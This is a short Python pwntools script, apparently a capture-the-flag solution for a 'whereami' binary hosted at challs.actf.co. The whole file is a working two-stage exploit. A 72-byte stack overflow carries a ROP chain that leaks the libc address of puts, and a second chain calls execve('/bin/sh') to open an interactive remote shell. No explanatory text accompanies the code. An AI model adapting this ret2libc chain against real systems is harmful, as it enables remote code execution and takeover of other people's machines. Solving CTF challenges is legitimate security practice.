#!/bin/python3
from pwn import *


HOST = 'challs.actf.co'
PORT = 31222

EXE  = './whereami'


# if args.EXPLOIT:
r = remote(HOST, PORT)
libc = ELF('./libc.so.6')
# else:
# r=process('./whereami')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

exe = ELF(EXE)
pop_rdi = 0x401303
ret=0x40101a
pop_rsi = 0x2604f
# pop_rdx = 0x119241
pop_rdx = 0x15f7e6
# pop_rdx = 0x1149c0
offset  = libc.symbols['puts']
# print(offset)


print(r.recvuntil('?'))
print("Sending payload1")
payload  = b'A'*72
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
# print(hex(exe.symbols['main']))
payload += p64(exe.symbols['main']+112)

r.sendline(payload)
print(r.recvline())
leak=r.recvline()[:-1]
leak=u64(leak+b'\x00\x00')
print(hex(leak))
# print(r.recvuntil('?'))
print("Sending payload2")


libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
system       = libc.symbols['system']
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']

payload  = b'A'*72
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address+pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address+pop_rdx)
payload += p64(nullptr)
payload += p64(nullptr)
payload += p64(execve)
# print(payload)

r.sendline(payload)
# print(r.recvline())
# gdb.attach(r,"""""")
r.interactive()